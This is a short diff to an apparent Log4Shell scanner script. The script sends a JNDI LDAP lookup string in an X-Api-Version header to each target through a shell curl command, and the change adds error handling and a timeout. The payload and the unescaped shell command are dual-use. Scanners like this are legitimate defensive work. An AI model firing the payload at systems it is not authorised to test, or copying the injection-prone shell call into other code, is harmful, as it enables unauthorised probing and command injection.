@@ -12,15 +12,17 @@ def scan():
 
     # Checking Targets
     for target in targets:
-        check_url = "${jndi:ldap://log4shell.huntress.com:1389/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}"
-        bashCommand = "curl " + f"{target} " + "-k -H -m 5 " + f"'X-Api-Version: {check_url}'"
-        subprocess.Popen(bashCommand, shell=True)
-        print("trying " + target + " " + bashCommand)
+        try:
+            check_url = "${jndi:ldap://log4shell.huntress.com:1389/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}"
+            bashCommand = "curl " + f"{target} " + "-k -H " + f"'X-Api-Version: {check_url}'"
+            print("trying: " +  bashCommand)
+            subprocess.call(bashCommand, timeout=5, shell=True)
+        except:
+            pass
 
     # Result URL
     result_guid = check_url.replace("${jndi:ldap://log4shell.huntress.com:1389/", "").replace("}","")
     result_url = "https://log4shell.huntress.com/view/" + result_guid
-    time.sleep(10)
     print("\npleasecheck: " + result_url )
 
 if __name__ == '__main__':
